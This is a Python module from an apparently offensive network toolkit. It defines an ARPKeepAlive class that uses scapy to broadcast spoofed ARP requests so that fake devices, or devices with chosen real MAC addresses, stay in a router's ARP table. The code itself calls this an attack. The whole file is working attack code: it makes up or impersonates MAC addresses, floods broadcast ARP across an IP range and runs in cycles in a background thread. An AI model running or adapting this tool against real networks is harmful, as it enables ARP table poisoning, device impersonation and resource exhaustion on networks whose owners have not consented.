import random
import re
import threading
import time
from typing import List, Optional

from scapy.all import sendp
from scapy.arch import get_if_list
from scapy.layers.l2 import ARP, Ether
from scapy.packet import Packet

from netarmageddon.utils.output_manager import (
    BOLD,
    BRIGHT_CYAN,
    BRIGHT_WHITE,
    BRIGHT_YELLOW,
    CLEAR,
    CMD,
    DEBUG,
    ERROR,
    HEAD,
    INFO,
    RESET,
    SUCCESS,
    THIN_DELIM,
    WARNING,
    make_progress_bar,
)

_MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")


class ARPKeepAlive:
    """Maintain fake devices in a router's ARP table."""

    MAX_PPS: int = 100  # Safety limit for packets per second

    def __init__(
        self,
        interface: str,
        base_ip: str,
        num_devices: int = 50,
        mac_prefix: str = "de:ad:00",
        interval: float = 5.0,
        cycles: int = 1,
        target_macs: Optional[List[str]] = None,
    ) -> None:
        self.interface = interface
        self.base_ip = base_ip
        self.mac_prefix = mac_prefix
        self.interval = interval
        self.cycles = cycles
        self.running = False
        self.thread: Optional[threading.Thread] = None
        self._stopped = False
        self.start_time = time.time()

        # When target_macs is provided, they define both the MACs and the
        # device count; num_devices is ignored in that case.
        self.target_macs: Optional[List[str]] = None
        if target_macs is not None:
            self._validate_target_macs(target_macs)
            self.target_macs = [m.lower().strip() for m in target_macs]
            self.num_devices = len(self.target_macs)
        else:
            self.num_devices = num_devices

        self._validate_interface()
        self._validate_ip()
        if not self.target_macs:
            self._validate_mac_prefix()

        HEAD("⬡  ARP Keep-Alive — Configuration")
        CMD(f"  {'Interface':<20} {BRIGHT_CYAN}{interface}{RESET}")
        CMD(f"  {'Base IP':<20} {BRIGHT_CYAN}{base_ip}<1..{self.num_devices}>{RESET}")
        CMD(f"  {'Devices':<20} {BRIGHT_CYAN}{self.num_devices}{RESET}")
        if self.target_macs:
            CMD(f"  {'Target MACs':<20} {BRIGHT_CYAN}" f"{', '.join(self.target_macs)}{RESET}")
        else:
            CMD(f"  {'MAC Prefix':<20} {BRIGHT_CYAN}{mac_prefix}:xx:xx:xx{RESET}")
        CMD(f"  {'Interval':<20} {BRIGHT_CYAN}{interval}s between cycles{RESET}")
        CMD(f"  {'Cycles':<20} {BRIGHT_CYAN}{cycles}{RESET}")
        CMD(THIN_DELIM)

    def _validate_target_macs(self, macs: List[str]) -> None:
        DEBUG(f"Validating {len(macs)} target MAC(s)")
        if not macs:
            ERROR("target_macs list must not be empty")
            raise ValueError("target_macs list must not be empty")
        for mac in macs:
            if not _MAC_RE.match(mac.strip()):
                ERROR(f"Invalid target MAC address: {mac}")
                raise ValueError(
                    f"Invalid MAC address '{mac}'. " "Use format like '00:11:22:33:44:55'"
                )
        INFO(f"All {len(macs)} target MAC address(es) validated")

    def _validate_interface(self) -> None:
        DEBUG(f"Validating interface: {self.interface}")
        if self.interface not in get_if_list():
            ERROR(f"Interface '{self.interface}' not found!")
            CMD(f"  Available: {BRIGHT_CYAN}{', '.join(get_if_list())}{RESET}")
            raise ValueError(f"Interface '{self.interface}' not found")
        INFO(f"Interface {BOLD}{BRIGHT_CYAN}{self.interface}{RESET} validated")

    def _validate_ip(self) -> None:
        DEBUG(f"Validating base IP: {self.base_ip}")
        if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.$", self.base_ip):
            ERROR(f"Invalid base IP format: {self.base_ip}")
            raise ValueError("Use format like '192.168.1.'")
        INFO("Base IP format validated")

    def _validate_mac_prefix(self) -> None:
        DEBUG(f"Validating MAC prefix: {self.mac_prefix}")
        if not re.match(r"^([0-9A-Fa-f]{2}:){2}[0-9A-Fa-f]{2}$", self.mac_prefix):
            ERROR(f"Invalid MAC prefix: {self.mac_prefix}")
            raise ValueError("Use format like 'de:ad:00'")
        INFO("MAC prefix format validated")

    def _rate_limit(self, pps: int) -> int:
        if pps > self.MAX_PPS:
            WARNING(f"Rate capped: {pps} → {self.MAX_PPS} pps (safety limit)")
            return self.MAX_PPS
        return pps

    def _generate_mac(self, ip_suffix: int) -> str:
        """Return MAC address for this device slot.

        When *target_macs* is set the MAC at index ``ip_suffix - 1`` is
        returned verbatim (no randomness — these are the MACs we want to
        keep alive).  Otherwise a pseudo-random MAC is built from
        *mac_prefix* + ip_suffix + two random octets, exactly as before.
        """
        if self.target_macs is not None:
            return self.target_macs[ip_suffix - 1]
        mac = (
            f"{self.mac_prefix}:"
            f"{ip_suffix:02x}:"
            f"{random.randint(0, 0xff):02x}:"
            f"{random.randint(0, 0xff):02x}"
        )
        return mac

    def _generate_arp_packet(self, ip_suffix: int) -> Packet:
        ip = f"{self.base_ip}{ip_suffix}"
        mac = self._generate_mac(ip_suffix)
        return Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, hwsrc=mac, psrc=ip, pdst=ip)

    def _send_arp_announcements(self) -> None:
        try:
            INFO("🚀 Starting ARP keep-alive attack")
            pps = max(1, self.num_devices)
            allowed_pps = self._rate_limit(pps)
            delay = 1.0 / allowed_pps if allowed_pps > 0 else 0

            INFO(
                f"  Rate: {BOLD}{BRIGHT_YELLOW}{allowed_pps}{RESET} pps  |  "
                f"Cycles: {BOLD}{BRIGHT_WHITE}{self.cycles}{RESET}"
            )

            for cycle in range(1, self.cycles + 1):
                if not self.running:
                    break

                INFO(
                    f"  Cycle {BOLD}{BRIGHT_YELLOW}{cycle}{RESET}"
                    f"/{BRIGHT_WHITE}{self.cycles}{RESET}"
                )

                for i in range(1, self.num_devices + 1):
                    if not self.running:
                        break

                    pkt = self._generate_arp_packet(i)
                    try:
                        sendp(pkt, iface=self.interface, verbose=False)
                        bar = make_progress_bar(i, self.num_devices)
                        CLEAR()
                        INFO(
                            f"  Sending {bar}  "
                            f"{BRIGHT_CYAN}{i}{RESET}/{BRIGHT_WHITE}{self.num_devices}{RESET}",
                            end="\r",
                        )
                    except PermissionError as e:
                        ERROR(f"Permission error: {e}")
                        self.stop()
                        return
                    time.sleep(delay)

                INFO("")  # newline after progress bar

                if cycle < self.cycles and self.running:
                    SUCCESS(f"Cycle {cycle} complete — waiting {self.interval}s")
                    time.sleep(self.interval)

        finally:
            self.stop()

    def start(self) -> None:
        if not self.running:
            DEBUG("Spawning ARP thread")
            self.running = True
            self.thread = threading.Thread(
                target=self._send_arp_announcements, name="ARPKeepAliveThread"
            )
            self.thread.start()

    def stop(self) -> None:
        if not self.running and self._stopped:
            return
        DEBUG("Initiating ARP shutdown")
        self.running = False

        if self.thread and self.thread.is_alive():
            if threading.current_thread() is not self.thread:
                self.thread.join(timeout=5)
                if self.thread.is_alive():
                    WARNING("ARP thread shutdown delayed")

        duration = time.time() - self.start_time
        INFO(f"  Total duration: {BOLD}{BRIGHT_WHITE}{duration:.1f}s{RESET}")
        SUCCESS("ARP keep-alive terminated cleanly")
        self._stopped = True

    def user_abort(self) -> None:
        WARNING("User requested stop")
        self.stop()

    def __enter__(self) -> "ARPKeepAlive":
        self.start()
        return self

    def __exit__(self, exc_type: object, exc_val: object, exc_tb: object) -> None:
        if not self._stopped:
            self.stop()
